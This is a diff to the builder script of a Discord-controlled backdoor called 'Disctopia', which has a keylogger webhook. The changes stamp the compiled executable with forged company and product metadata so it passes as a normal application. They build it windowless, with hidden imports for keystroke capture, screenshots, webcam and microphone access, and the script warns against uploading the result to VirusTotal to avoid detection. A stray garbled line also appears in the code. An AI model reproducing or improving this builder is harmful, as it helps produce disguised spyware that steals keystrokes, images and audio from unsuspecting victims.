@@ -28,7 +28,6 @@ Run 'help use' to get started!
 
 PAYLOAD_SETTINGS = ["Backdoor Name", "Guild ID", "Bot Token", "Channel ID", "Keylogger Webhook"]
 
-
 def create_table(settings):
     table = PrettyTable(["Setting", "Value"])
     for name, value in zip(PAYLOAD_SETTINGS, settings):
@@ -38,23 +37,72 @@ def create_table(settings):
         print("[!] Please select a valid payload!\n")
     return table
 
-def get_pyinstaller_path():
-    username = getpass.getuser()
-    home = os.path.expanduser('~')
-    candidates = [
-        os.path.join(home, '.wine64', 'drive_c', 'users', username, 'Local Settings', 'Application Data', 'Programs', 'Python', 'Python38', 'Scripts', 'pyinstaller.exe'),
-        os.path.join(home, '.wine64', 'drive_c', 'users', username, 'AppData', 'Local', 'Programs', 'Python', 'Python38', 'Scripts', 'pyinstaller.exe'),
-        '/home/kali/.wine64/drive_c/users/kali/AppData/Local/Programs/Python/Python38/Scripts/pyinstaller.exe'
+def get_default_meta(app_name):
+    cap = app_name.capitalize()
+    low = app_name.lower()
+    return [
+        ("CompanyName", cap),
+        ("FileDescription", f"{cap}"),
+        ("ProductName", cap),
+        ("InternalName", low),
+        ("OriginalFilename", f"{low}.exe"),
     ]
-    for path in candidates:
-        if os.path.exists(path):
-            return path
-    return None
+íí
+def prompt_metadata(meta):
+    print("\n[+] Enter application metadata (leave blank to keep current value):")
+    for i, (field, default) in enumerate(meta):
+        value = input(f"> {field} [{default}]: ").strip()
+        if value:
+            meta[i] = (field, value)
+    print("[+] Metadata updated!\n")
 
-def build_backdoor( settings):    
-    template_path = "code/discord/main.py"
+def write_version_txt(meta, path="version.txt"):
+    content = f"""VSVersionInfo(
+  ffi=FixedFileInfo(
+    filevers=(1, 0, 0, 0),
+    prodvers=(1, 0, 0, 0),
+    mask=0x3f,
+    flags=0x0,
+    OS=0x40004,
+    fileType=0x1,
+    subtype=0x0,
+    date=(0, 0)
+  ),
+  kids=[
+    StringFileInfo([
+      StringTable(
+        '040904B0',
+        [
+{chr(10).join([f"          StringStruct('{k}', '{v}')," for k, v in meta])}
+        ]
+      )
+    ]),
+    VarFileInfo([VarStruct('Translation', [1033, 1200])])
+  ]
+)
+"""
+    with open(path, "w", encoding="utf-8") as f:
+        f.write(content)
+
+def build_backdoor(settings, meta=None):
+    import shutil
+
+    app_name = settings[0]
+    if not app_name or app_name.lower() == "none":
+        print("[!] Application name must be set before building.")
+        return
+
+    # Set default meta if not provided
+    if meta is None:
+        meta = get_default_meta(app_name)
+    else:
+        # Fill in any missing/None meta fields with defaults
+        defaults = get_default_meta(app_name)
+        meta = [(field, val if val and val != "None" else defval) for (field, val), (_, defval) in zip(meta, defaults)]
+
+    template_path = "main.py"
     try:
-        with open(template_path, 'r') as f:
+        with open(template_path, 'r', encoding='utf-8') as f:
             file = f.read()
         newfile = file.replace("{GUILD}", str(settings[1]))
         newfile = newfile.replace("{TOKEN}", str(settings[2]))
@@ -65,24 +113,50 @@ def build_backdoor( settings):
         return
 
     filename = f"{settings[0]}.py"
-    with open(filename, 'w') as f:
+    with open(filename, 'w', encoding='utf-8') as f:
         f.write(newfile)
 
-    # Always build for Windows (Wine + icon)
-    pyinstaller_path = get_pyinstaller_path()
-    if not pyinstaller_path:
-        print("[!] PyInstaller not found in Wine prefix. Please ensure Python and PyInstaller are installed under Wine.")
-        return
-    compile_command = [
-        "wine", pyinstaller_path, "--onefile", "--noconsole", "--icon=img/exe_file.ico", filename
+    write_version_txt(meta)
+
+    # Windows pyinstaller command
+    py_cmd = [
+        "pyinstaller",
+        "--onefile",
+        "--noconsole",
+        "--icon=img/exe_file.ico",
+        "--version-file=version.txt",
+        "--hidden-import=discord",
+        "--hidden-import=discord.ext.commands",
+        "--hidden-import=discord.ext",
+        "--hidden-import=discord_webhook",
+        "--hidden-import=psutil",
+        "--hidden-import=keyboard",
+        "--hidden-import=pyautogui",
+        "--hidden-import=pyscreeze",
+        "--hidden-import=PIL",
+        "--hidden-import=win32api",
+        "--hidden-import=win32con",
+        "--hidden-import=win32gui",
+        "--hidden-import=Crypto",
+        "--hidden-import=cv2",
+        "--hidden-import=sounddevice",
+        "--hidden-import=scipy",
+        "--hidden-import=scipy._cyutility",
+        "--hidden-import=scipy.special._cdflib",
+        filename
     ]
 
-    subprocess.call(compile_command)
+    subprocess.call(py_cmd)
+
+    # Cleanup
     for ext in [".py", ".spec"]:
         try:
             os.remove(settings[0] + ext)
         except FileNotFoundError:
             pass
+
+    shutil.rmtree("build", ignore_errors=True)
+
     print('\n[+] The Backdoor can be found inside the "dist" directory')
     print('\nDO NOT UPLOAD THE BACKDOOR TO VIRUS TOTAL')
 
@@ -125,6 +199,7 @@ def main():
     print_banner()
 
     settings = ["None"] * 5
+    meta = get_default_meta("None")
 
     while True:
         try:
@@ -143,24 +218,46 @@ def main():
                     print_help()
                 else:
                     print_help(command_list[1].lower())
-                    
+
+            elif cmd == "meta":
+                prompt_metadata(meta)
+                continue
+
             elif cmd == "set":
-                if len(command_list) < 3:
-                    print("[!] Please specify a setting!\n")
+                # Interactive prompt if no arguments
+                if len(command_list) == 1:
+                    for i, setting in enumerate(PAYLOAD_SETTINGS):
+                        value = input(f"> {setting} : ").strip()
+                        settings[i] = value
+                    # Update meta defaults after name is set
+                    meta = get_default_meta(settings[0])
+                    print("[+] All settings updated!\n")
+                    continue
+                # If user provides all 5 values at once
+                elif len(command_list) == 6:
+                    settings[:] = command_list[1:6]
+                    meta = get_default_meta(settings[0])
+                    print("[+] All settings updated!\n")
+                    continue
+                # If user provides a single setting and value
+                elif len(command_list) == 3:
+                    setting, value = command_list[1].lower(), command_list[2]
+                    setting_map =  {"name": 0, "guild-id": 1, "bot-token": 2, "channel-id": 3, "webhook": 4}
+                    if setting in setting_map:
+                        settings[setting_map[setting]] = value
+                        if setting == "name":
+                            meta = get_default_meta(value)
+                        print(f"[+] {PAYLOAD_SETTINGS[setting_map[setting]]} updated!\n")
+                    else:
+                        print("[!] Invalid setting!\n")
+                    continue
+                else:
+                    print("[!] Usage:\n  set <setting> <value>\n  set <name> <guild-id> <bot-token> <channel-id> <webhook>\n")
                     continue
 
-                setting, value = command_list[1].lower(), command_list[2]
-
-                setting_map =  {"name": 0, "guild-id": 1, "bot-token": 2, "channel-id": 3, "webhook": 4}
-
-                if setting in setting_map:
-                    settings[setting_map[setting]] = value
-                else:
-                    print("[!] Invalid setting!\n")
-
             elif cmd == "config":
-                    print(f"\n{create_table(settings).get_string(title='Disctopia Backdoor Settings')}")
-                    print("Run 'help set' for more information\n")
+                print(f"\n{create_table(settings).get_string(title='Disctopia Backdoor Settings')}")
+                print("Run 'help set' for more information\n")
 
             elif cmd == "clear":
                 clear_screen()
@@ -172,7 +269,7 @@ def main():
                 confirm = input("[?] Are you sure you want to build the backdoor? (y/n): ").strip().lower()
                 if confirm == "y" or confirm == "yes":
                     print("[+] Building backdoor...")
-                    build_backdoor(settings)
+                    build_backdoor(settings, meta)
                     break
             else:
                 print("[!] Invalid command! Type 'help' for options.")
